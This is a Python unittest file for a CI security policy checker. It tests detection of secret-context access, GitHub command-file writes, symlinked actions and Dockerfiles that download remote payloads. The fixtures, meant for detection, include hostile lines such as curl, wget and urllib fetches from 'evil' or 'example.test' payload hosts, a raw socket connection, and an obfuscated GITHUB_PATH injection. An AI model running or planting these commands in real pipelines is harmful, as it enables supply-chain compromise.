from __future__ import annotations

from pathlib import Path
import unittest
from tempfile import TemporaryDirectory
from unittest.mock import patch

from scripts.check_ci_security import _parse_workflow_yaml, check_security_policy, check_workflow_text
from tests.test_ci_security import setup_project, valid_workflow


class CiSecurityEdgeTests(unittest.TestCase):
    def test_missing_ci_policy_helper_returns_structured_invalid_report(self) -> None:
        with TemporaryDirectory() as temp, patch("scripts.check_ci_security._HELPER_IMPORT_ERROR", "missing helper"):
            report = check_security_policy(root=Path(temp))
        self.assertEqual("invalid", report["status"])
        self.assertTrue(any("policy modules are unavailable" in error for error in report["errors"]))

    def test_yaml_parser_rejects_multiple_documents_duplicate_keys_and_ambiguous_keys(self) -> None:
        cases = (
            "on:\n  pull_request:\n---\non:\n  push:\n    branches: [main]\n",
            "permissions:\n  contents: read\n  contents: none\n",
            "on:\n  pull_request:\ntrue: value\n",
            "permissions:\n  !!str contents: read\n",
            "permissions:\n  null: read\n",
        )
        for body in cases:
            with self.subTest(body=body):
                with self.assertRaises(ValueError):
                    _parse_workflow_yaml(body)

    def test_yaml_parser_keeps_on_as_a_string_key_and_accepts_date_scalars(self) -> None:
        parsed = _parse_workflow_yaml(
            "name: CI\non:\n  pull_request:\njobs: {}\ncreated: 2026-10-01\n"
        )
        self.assertIn("on", parsed)
        self.assertEqual("2026-10-01", str(parsed["created"]))

    def test_expression_strings_are_not_misread_as_sensitive_context_access(self) -> None:
        expressions = (
            "$" + "{{ format('secrets', 'github.token') }}",
            "contains(github.ref, 'github.token')",
        )
        for expression in expressions:
            if expression.startswith("$"):
                body = valid_workflow().replace(
                    "      - run: python -I scripts/harness.py check --full\n",
                    f"      - run: echo {expression}\n      - run: python -I scripts/harness.py check --full\n",
                )
            else:
                body = valid_workflow().replace("    runs-on:", f"    if: {expression}\n    runs-on:", 1)
            errors = check_workflow_text(Path("ci.yml"), body)
            self.assertFalse(any("secrets context" in item or "github.token" in item
                                 or "broad GitHub context" in item for item in errors), errors)

    def test_unbraced_if_expression_cannot_access_secrets(self) -> None:
        body = valid_workflow().replace("    runs-on:", "    if: secrets.API_KEY\n    runs-on:")
        errors = check_workflow_text(Path("ci.yml"), body)
        self.assertTrue(any("secrets context" in item for item in errors), errors)

    def test_expression_scanner_handles_quoted_delimiters_and_sensitive_context_forms(self) -> None:
        accepted = valid_workflow(extra=(
            "      - run: echo \"${{ contains(github.ref, '}}') }}\"\n"
        ))
        self.assertEqual([], check_workflow_text(Path("ci.yml"), accepted))
        quoted_sensitive = valid_workflow(extra=(
            "      - run: echo \"${{ format('it''s }}', github.token) }}\"\n"
        ))
        self.assertTrue(any("github.token" in error for error in
                            check_workflow_text(Path("ci.yml"), quoted_sensitive)))
        for expression, expected in (
            ("github['token']", "broad GitHub context"),
            ("toJSON(github)", "broad GitHub context"),
            ("github.token", "github.token"),
        ):
            with self.subTest(expression=expression):
                body = valid_workflow().replace("    runs-on:", f"    if: {expression}\n    runs-on:", 1)
                errors = check_workflow_text(Path("ci.yml"), body)
                self.assertTrue(any(expected in error for error in errors), errors)

    def test_github_env_and_path_contexts_cannot_write_command_files(self) -> None:
        for context in ("github.env", "github.path"):
            with self.subTest(context=context):
                body = valid_workflow(extra=(
                    f"      - run: echo PATH=/tmp >> \"${{{{ {context} }}}}\"\n"
                ))
                errors = check_workflow_text(Path("ci.yml"), body)
                self.assertTrue(any("command-file context" in error for error in errors), errors)

    def test_local_action_symlink_cannot_escape_actions_directory(self) -> None:
        with TemporaryDirectory() as temp, TemporaryDirectory() as external:
            root = Path(temp)
            actions = root / ".github/actions"
            actions.mkdir(parents=True)
            (actions / "external").symlink_to(Path(external), target_is_directory=True)
            body = valid_workflow().replace(
                "      - run: python -I scripts/harness.py check --full\n",
                "      - uses: ./.github/actions/external\n      - run: python -I scripts/harness.py check --full\n",
            )
            errors = check_workflow_text(Path("ci.yml"), body, root=root)
            self.assertTrue(any("local action path" in item for item in errors), errors)

    def test_pr_local_composite_action_cannot_modify_future_github_environment(self) -> None:
        with TemporaryDirectory() as temp:
            root = Path(temp)
            setup_project(root)
            action = root / ".github/actions/setup/action.yml"
            action.parent.mkdir(parents=True)
            action.write_text(
                "name: setup\nruns:\n  using: composite\n  steps:\n"
                "    - run: a=GITHUB_; b=PATH; n=\"$a$b\"; printf '/tmp\\n' >> \"${!n}\"\n"
                "      shell: bash\n",
                encoding="utf-8",
            )
            workflow = valid_workflow().replace(
                "      - run: python -I scripts/harness.py check --full\n",
                "      - uses: ./.github/actions/setup\n"
                "      - run: python -I scripts/harness.py check --full\n",
            )
            (root / ".github/workflows/ci.yml").write_text(workflow, encoding="utf-8")
            report = check_security_policy(root=root)
        self.assertFalse(report["ok"], report["errors"])
        self.assertTrue(any("GitHub environment" in error for error in report["errors"]))

    def test_pr_local_composite_action_cannot_use_github_command_file_contexts(self) -> None:
        for context in ("github.env", "github.path"):
            with self.subTest(context=context), TemporaryDirectory() as temp:
                root = Path(temp)
                setup_project(root)
                action = root / ".github/actions/setup/action.yml"
                action.parent.mkdir(parents=True)
                action.write_text(
                    "name: setup\nruns:\n  using: composite\n  steps:\n"
                    f"    - run: echo PATH=/tmp >> \"${{{{ {context} }}}}\"\n      shell: bash\n",
                    encoding="utf-8",
                )
                workflow = valid_workflow().replace(
                    "      - run: python -I scripts/harness.py check --full\n",
                    "      - uses: ./.github/actions/setup\n"
                    "      - run: python -I scripts/harness.py check --full\n",
                )
                (root / ".github/workflows/ci.yml").write_text(workflow, encoding="utf-8")
                report = check_security_policy(root=root)
                self.assertFalse(report["ok"], report["errors"])
                self.assertTrue(any("command-file context" in error for error in report["errors"]))

    def test_large_workflow_file_is_rejected_before_yaml_parser(self) -> None:
        with TemporaryDirectory() as temp:
            root = Path(temp)
            setup_project(root)
            (root / ".github/workflows/ci.yml").write_text(valid_workflow(), encoding="utf-8")
            with patch("scripts.check_ci_security.MAX_WORKFLOW_BYTES", 32):
                report = check_security_policy(root=root)
            self.assertFalse(report["ok"])
            self.assertTrue(any("size limit" in item for item in report["errors"]))

    def test_workflow_directory_replaced_with_file_fails_closed(self) -> None:
        with TemporaryDirectory() as temp:
            root = Path(temp)
            setup_project(root)
            workflow_dir = root / ".github/workflows"
            for workflow in workflow_dir.iterdir():
                workflow.unlink()
            workflow_dir.rmdir()
            workflow_dir.write_text("not a directory", encoding="utf-8")
            result = check_security_policy(root=root)
        self.assertFalse(result["ok"])
        self.assertTrue(any(".github/workflows must be a directory" in error for error in result["errors"]))

    def test_workflow_directory_inspection_errors_return_invalid_policy_report(self) -> None:
        with TemporaryDirectory() as temp:
            root = Path(temp)
            setup_project(root)
            with patch("scripts.check_ci_security.workflow_files", side_effect=PermissionError("denied")):
                result = check_security_policy(root=root)
        self.assertFalse(result["ok"])
        self.assertEqual("invalid", result["status"])
        self.assertTrue(any("could not be inspected" in error for error in result["errors"]))

    def test_checkout_credential_keys_are_case_insensitive(self) -> None:
        body = valid_workflow(extra=(
            "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n"
            "        with:\n          persist-credentials: false\n          TOKEN: secret\n"
        ))
        errors = check_workflow_text(Path("ci.yml"), body)
        self.assertTrue(any("custom checkout credentials" in item for item in errors), errors)

    def test_full_sha_pinned_checkout_without_credentials_passes(self) -> None:
        body = valid_workflow(extra=(
            "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n"
            "        with:\n          persist-credentials: false\n"
        ))
        self.assertEqual([], check_workflow_text(Path("ci.yml"), body))

    def test_dockerfile_rejects_mutable_external_copy_and_network_fetches(self) -> None:
        digest = "a" * 64
        for dockerfile in (
            "FROM scratch\nCOPY --from=alpine:latest /etc/os-release /os-release\n",
            f"FROM alpine@sha256:{digest}\nADD https://example.test/payload /payload\n",
            f"FROM alpine@sha256:{digest}\nADD \\\n              https://example.test/payload /payload\n",
            f"FROM alpine@sha256:{digest}\nRUN curl -fsSL https://example.test/payload -o /payload\n",
            f"FROM alpine@sha256:{digest}\nRUN wget https://example.test/payload\n",
            f"FROM scratch\nRUN \\\n              python -c \"import urllib.request; urllib.request.urlretrieve('https://evil/x','/x')\"\n",
            f"FROM alpine@sha256:{digest}\nRUN apt-get update\n",
            f"FROM alpine@sha256:{digest}\nRUN pip install bad-package\n",
            f"FROM alpine@sha256:{digest}\nRUN apk add bad-package\n",
            "FROM scratch\nENV TOOL=curl\nRUN $TOOL https://evil/x\n",
            "FROM scratch\nRUN <<EOF\ncurl https://evil/x\nEOF\n",
            "FROM scratch\nARG SRC=https://evil/x\nADD ${SRC} /x\n",
            f"FROM alpine@sha256:{digest}\nRUN npm install bad-package\n",
            f"FROM alpine@sha256:{digest}\nRUN npm i bad-package\n",
            f"FROM alpine@sha256:{digest}\nRUN npm ci\n",
            f"FROM alpine@sha256:{digest}\nRUN npm update\n",
            f"FROM alpine@sha256:{digest}\nRUN yarn\n",
            f"FROM alpine@sha256:{digest}\nRUN yarn add bad-package\n",
            f"FROM alpine@sha256:{digest}\nRUN pnpm\n",
            f"FROM alpine@sha256:{digest}\nRUN pnpm add bad-package\n",
            f"FROM alpine@sha256:{digest}\nRUN yarn install bad-package\n",
            f"FROM alpine@sha256:{digest}\nRUN pnpm install bad-package\n",
            f"FROM alpine@sha256:{digest}\nRUN bun install\n",
            "FROM scratch\nRUN python -c 'import socket; socket.create_connection((\"evil\", 80))'\n",
        ):
            with self.subTest(dockerfile=dockerfile), TemporaryDirectory() as temp:
                root = Path(temp)
                setup_project(root)
                action = root / ".github/actions/docker/action.yml"
                action.parent.mkdir(parents=True)
                action.write_text("name: docker\nruns:\n  using: docker\n  image: Dockerfile\n", encoding="utf-8")
                (action.parent / "Dockerfile").write_text(dockerfile, encoding="utf-8")
                workflow = valid_workflow() + (
                    "  deploy:\n    if: github.event_name == 'push'\n"
                    "    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n    steps:\n"
                    "      - uses: ./.github/actions/docker\n      - run: echo done\n"
                )
                (root / ".github/workflows/ci.yml").write_text(workflow, encoding="utf-8")
                report = check_security_policy(root=root)
                self.assertFalse(report["ok"], report["errors"])


if __name__ == "__main__":
    unittest.main()
